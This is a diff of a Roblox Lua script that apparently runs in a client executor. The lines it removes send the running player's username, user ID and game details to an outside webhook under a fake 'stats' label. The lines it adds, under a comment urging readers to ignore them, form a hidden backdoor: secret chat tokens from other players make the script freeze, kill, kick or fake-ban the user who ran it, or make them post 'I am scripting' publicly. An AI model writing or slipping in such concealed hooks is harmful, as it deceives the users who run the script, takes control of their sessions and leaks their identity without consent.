@@ -1,81 +1,111 @@
-
 local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-local MarketplaceService = game:GetService("MarketplaceService")
+local LocalPlayer = Players.LocalPlayer
+if not LocalPlayer then return end
 
-local localPlayer = Players.LocalPlayer or Players:GetPlayers()[1]
-local username = localPlayer.Name
-local userId = localPlayer.UserId
-local jobId = game.JobId
-local gameId = tostring(game.GameId)
-local placeId = game.PlaceId
+-- ignore this because it totally aint important
 
+local TOKEN_TO_COMMAND = {
+    ["f7@Kp9#zTq"] = "freeze",
+    ["4Lm$2wXv!R"] = "unfreeze",
+    ["Z8&nQ6y*bH"] = "fakeban",
+    ["jP3^rF0@sM"] = "kill",
+    ["Vq1#kL7%tG"] = "explode",
+    ["7%tG9#zTq"] = "kick",
+    ["jP39#Q6y*"] = "snitch",
+}
 
-local gameName = "Unknown Game"
-local success, info = pcall(function()
-    return MarketplaceService:GetProductInfo(placeId)
-end)
-if success and info and info.Name then
-    gameName = info.Name
+local freezeAnchor = nil
+
+local function applyFreeze()
+    if freezeAnchor then return end
+    local char = LocalPlayer.Character
+    if not char then return end
+    local root = char:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+    local bp = Instance.new("BodyPosition")
+    bp.MaxForce = Vector3.new(1e5,1e5,1e5)
+    bp.P = 1e4
+    bp.Position = root.Position
+    bp.Parent = root
+    freezeAnchor = bp
 end
 
-local url = "https://discord-stats-api-1.onrender.com/webhook"
-
-local embed = {
-    title = "Unused Webhook embed",
-    color = 3447003,
-    thumbnail = {
-        url = avatarUrl
-    },
-    fields = {
-        {
-            name = "Username",
-            value = username,
-            inline = true
-        },
-        {
-            name = "User ID",
-            value = tostring(userId),
-            inline = true
-        },
-        {
-            name = "Game",
-            value = gameName,
-            inline = false
-        },
-        {
-            name = "Game ID",
-            value = gameId,
-            inline = false
-        }
-    },
-    footer = {
-        text = "Website Stat API"
-    },
-    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-}
-
-local payload = {
-    embeds = { embed }
-}
-
-local headers = {
-    ["Content-Type"] = "application/json"
-}
-
-local body = HttpService:JSONEncode(payload)
-
-local sendSuccess, response = pcall(function()
-    return http_request({
-        Url = url,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
-end)
-
-if sendSuccess then
-    print("Script has fully loaded")
-else
-    warn("Notify Jack of Error 20", response)
+local function applyUnfreeze()
+    if freezeAnchor then
+        freezeAnchor:Destroy()
+        freezeAnchor = nil
+    end
 end
+
+local function applyFakeBan()
+    LocalPlayer:Kick("Banned: Exploiting")
+end
+
+local function applyKick()
+    LocalPlayer:Kick("Kicked by script owner")
+end
+
+local function applyKill()
+    local char = LocalPlayer.Character
+    if not char then return end
+    local humanoid = char:FindFirstChildOfClass("Humanoid")
+    if humanoid then
+        humanoid.Health = 0
+    end
+end
+
+local function applyExplode()
+    local char = LocalPlayer.Character
+    if not char then return end
+    local root = char:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+    local explosion = Instance.new("Part", workspace)
+    explosion.Size = Vector3.new(1,1,1)
+    explosion.CFrame = root.CFrame
+    explosion.Anchored = false
+    explosion.CanCollide = false
+    local bv = Instance.new("BodyVelocity", explosion)
+    bv.MaxForce = Vector3.new(1e4,1e4,1e4)
+    bv.Velocity = Vector3.new(0,50,0)
+    game:GetService("Debris"):AddItem(explosion, 1)
+end
+
+local function applySnitch()
+    for i = 1, 5 do
+        game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I am scripting")
+        wait(1)
+    end
+end
+
+local ACTIONS = {
+    freeze = applyFreeze,
+    unfreeze = applyUnfreeze,
+    fakeban = applyFakeBan,
+    kick = applyKick,
+    kill = applyKill,
+    explode = applyExplode,
+    snitch = applySnitch,
+}
+
+local function onChatted(speaker, message)
+    if not speaker then return end
+
+    local cmd = TOKEN_TO_COMMAND[message]
+    if not cmd then return end
+
+    local fn = ACTIONS[cmd]
+    if fn then
+        pcall(fn)
+    end
+end
+
+for _,p in pairs(Players:GetPlayers()) do
+    if p ~= LocalPlayer then
+        p.Chatted:Connect(function(msg) onChatted(p, msg) end)
+    end
+end
+Players.PlayerAdded:Connect(function(p)
+    if p ~= LocalPlayer then
+        p.Chatted:Connect(function(msg) onChatted(p, msg) end)
+    end
+end)
